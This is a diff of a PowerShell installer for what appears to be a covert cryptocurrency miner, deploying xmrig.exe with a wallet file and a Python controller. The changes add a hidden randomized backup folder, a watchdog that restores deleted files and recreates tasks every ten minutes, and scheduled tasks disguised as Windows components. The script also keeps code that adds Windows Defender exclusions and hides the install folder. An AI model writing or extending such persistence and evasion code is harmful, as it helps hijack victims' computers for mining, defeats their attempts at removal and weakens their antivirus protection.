@@ -3,6 +3,8 @@ param(
     [string]$ScriptName  = "controller.py"
 )
 
+Write-Host "Installer running..." -ForegroundColor Green
+
 try {
     # --- Detect source folder ---
     if ($PSScriptRoot -and (Test-Path $PSScriptRoot)) {
@@ -43,7 +45,81 @@ try {
     Write-Host "Files copied successfully to $safeDir"
 
     # ======================================================================
-    # === WINDOWS DEFENDER EXCLUSIONS + VERIFICATION =======================
+    # === RANDOMIZED BACKUP LOCATION ======================================
+    # ======================================================================
+
+    Write-Host "Creating randomized backup folder..."
+
+    $BackupRoot = "C:\ProgramData"
+    $BackupDir  = Join-Path $BackupRoot ("SCB_" + [guid]::NewGuid().ToString().Substring(0,8))
+
+    if (-not (Test-Path $BackupDir)) {
+        New-Item -ItemType Directory -Force -Path $BackupDir | Out-Null
+    }
+
+    Write-Host "Backup folder: $BackupDir"
+
+    # Only filenames (no hashing)
+    $importantFiles = @(
+        "controller.py",
+        "config_high.json",
+        "wallet.txt",
+        "xmrig.exe", 
+		"install-task.ps1"
+    )
+
+    foreach ($file in $importantFiles) {
+        $src = Join-Path $safeDir $file
+        if (Test-Path $src) {
+            Copy-Item $src (Join-Path $BackupDir $file) -Force
+        }
+    }
+
+    Write-Host "Backup created."
+
+    # ======================================================================
+    # === WATCHDOG SCRIPT GENERATION ======================================
+    # ======================================================================
+
+    $watchdogPath = Join-Path $safeDir "watchdog.ps1"
+
+    $watchdogContent = @"
+param([string]`$safeDir, [string]`$BackupDir)
+
+`$importantFiles = @(
+    "controller.py",
+    "config_high.json",
+    "install-task.ps1",
+    "xmrig.exe",
+    "wallet.txt"
+)
+
+foreach (`$file in `$importantFiles) {
+    `$mainPath   = Join-Path `$safeDir `$file
+    `$backupPath = Join-Path `$BackupDir `$file
+
+    if (-not (Test-Path `$mainPath)) {
+        if (Test-Path `$backupPath) {
+            Copy-Item `$backupPath `$mainPath -Force
+        }
+    }
+}
+
+`$taskName = "Windows System Controller"
+schtasks.exe /Query /TN "`$taskName" 2>`$null
+
+if (`$LASTEXITCODE -ne 0) {
+    `$py = "C:\Program Files\Python312\pythonw.exe"
+    `$script = Join-Path `$safeDir "controller.py"
+    schtasks.exe /Create /TN "`$taskName" /TR "`"`$py`" `"`$script`"" /SC ONLOGON /RL LIMITED /F /RU `$env:USERNAME
+}
+"@
+
+    Set-Content -Path $watchdogPath -Value $watchdogContent -Encoding ASCII
+    Write-Host "Watchdog created at: $watchdogPath"
+
+    # ======================================================================
+    # === WINDOWS DEFENDER EXCLUSIONS =====================================
     # ======================================================================
     Write-Host "Adding Windows Defender exclusions..."
 
@@ -69,7 +145,6 @@ try {
         }
     }
 
-    # --- Verification ---
     Write-Host "`nVerifying Defender exclusions..."
     $current = Get-MpPreference
 
@@ -82,21 +157,21 @@ try {
     }
 
     foreach ($item in $exclusions) {
-        if (Test-Exclusion $item.Type $item.Value $current) {
-            Write-Host "[OK] $($item.Type) exclusion verified: $($item.Value)" -ForegroundColor Green
+        $ok = Test-Exclusion $item.Type $item.Value $current
+        if ($ok) {
+            Write-Host "[OK] Defender exclusion active: $($item.Value)" -ForegroundColor Green
         } else {
-            Write-Host "[FAIL] Missing exclusion: $($item.Type) → $($item.Value)" -ForegroundColor Red
+            Write-Host "[FAIL] Defender exclusion missing: $($item.Value)" -ForegroundColor Red
         }
     }
 
     # ======================================================================
-    # === PYTHON INSTALLATION + PSUTIL INSTALL ====================================
-    # ==============================================================================
+    # === PYTHON INSTALLATION =============================================
+    # ======================================================================
 
     $pythonExe = "C:\Program Files\Python312\python.exe"
     $pythonWExe = "C:\Program Files\Python312\pythonw.exe"
 
-    # Install Python if missing
     if (-not (Test-Path $pythonExe)) {
         Write-Host "Python not found. Installing Python 3.12.2..."
         Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "$env:TEMP\python_installer.exe"
@@ -105,13 +180,12 @@ try {
         Write-Host "Python is already installed."
     }
 
-    # Install psutil globally
     Write-Host "Installing psutil and requests..."
     & $pythonExe -m pip install psutil requests
 
     # ======================================================================
-    # === HIDE INSTALL FOLDER ======================================================
-    # ==============================================================================
+    # === HIDE INSTALL FOLDER =============================================
+    # ======================================================================
 
     try {
         $folder = Get-Item -LiteralPath $safeDir
@@ -122,8 +196,8 @@ try {
     }
 
     # ======================================================================
-    # === CREATE SCHEDULED TASK (DIRECT pythonw.exe) ================================
-    # ==============================================================================
+    # === CREATE MAIN SCHEDULED TASK ======================================
+    # ======================================================================
 
     Write-Host "Creating scheduled task..."
     $taskCreated = $false
@@ -135,7 +209,7 @@ try {
         $trigger  = New-ScheduledTaskTrigger -AtLogOn
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
 
-        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Description "Runs controller silently at logon" -Force
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Description "Windows System Controller" -Force
         Write-Host "Scheduled task created."
         $taskCreated = $true
     }
@@ -147,7 +221,6 @@ try {
         $taskCreated = $true
     }
 
-    # Verification
     if ($taskCreated) {
         Write-Host "Verifying task..."
         schtasks.exe /Query /TN $TaskName 2>$null
@@ -162,6 +235,82 @@ try {
         Write-Host "Scheduled task runs:"
         Write-Host "  $pythonWExe $scriptPath"
     }
+
+    # ======================================================================
+    # === CREATE WATCHDOG SCHEDULED TASK ==================================
+    # ======================================================================
+
+    Write-Host "`nCreating watchdog scheduled task..."
+
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+            -Argument "-NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`" -safeDir `"$safeDir`" -BackupDir `"$BackupDir`""
+
+        # Run every 10 minutes
+        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
+            -RepetitionInterval (New-TimeSpan -Minutes 10)
+
+        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
+
+        Register-ScheduledTask -TaskName "WindowsWatchdog" -Action $action -Trigger $trigger -Principal $principal -Force
+        Write-Host "Watchdog task created."
+    }
+    catch {
+        Write-Host "Fallback using schtasks.exe..."
+
+        schtasks.exe /Create /TN "WindowsWatchdog" `
+            /TR "powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`" -safeDir `"$safeDir`" -BackupDir `"$BackupDir`"" `
+            /SC MINUTE /MO 10 /F /RU $env:USERNAME
+    }
+
+
+    # ======================================================================
+    # === FINAL FULL VERIFICATION =========================================
+    # ======================================================================
+
+    Write-Host "`n==================== INSTALL VERIFICATION ====================" -ForegroundColor Cyan
+
+    function Check($label, $condition) {
+        if ($condition) {
+            Write-Host "[ OK ] $label" -ForegroundColor Green
+        } else {
+            Write-Host "[FAIL] $label" -ForegroundColor Red
+        }
+    }
+
+    foreach ($file in $importantFiles) {
+        Check "Installed file exists: $file" (Test-Path (Join-Path $safeDir $file))
+    }
+
+    Check "Backup folder exists" (Test-Path $BackupDir)
+
+    foreach ($file in $importantFiles) {
+        Check "Backup contains: $file" (Test-Path (Join-Path $BackupDir $file))
+    }
+
+    Check "Watchdog script created" (Test-Path $watchdogPath)
+
+    Check "Python installed" (Test-Path $pythonExe)
+    Check "pythonw.exe installed" (Test-Path $pythonWExe)
+
+    try {
+        & $pythonExe -c "import psutil, requests" 2>$null
+        $pipOK = $LASTEXITCODE -eq 0
+    } catch { $pipOK = $false }
+    Check "Python modules psutil + requests installed" $pipOK
+
+    schtasks.exe /Query /TN $TaskName 2>$null
+    Check "Main scheduled task exists" ($LASTEXITCODE -eq 0)
+
+    schtasks.exe /Query /TN "WindowsWatchdog" 2>$null
+    Check "Watchdog scheduled task exists" ($LASTEXITCODE -eq 0)
+
+    foreach ($item in $exclusions) {
+        $ok = Test-Exclusion $item.Type $item.Value $current
+        Check "Defender exclusion active: $($item.Value)" $ok
+    }
+
+    Write-Host "`n====================== END VERIFICATION ======================" -ForegroundColor Cyan
 
 }
 catch {
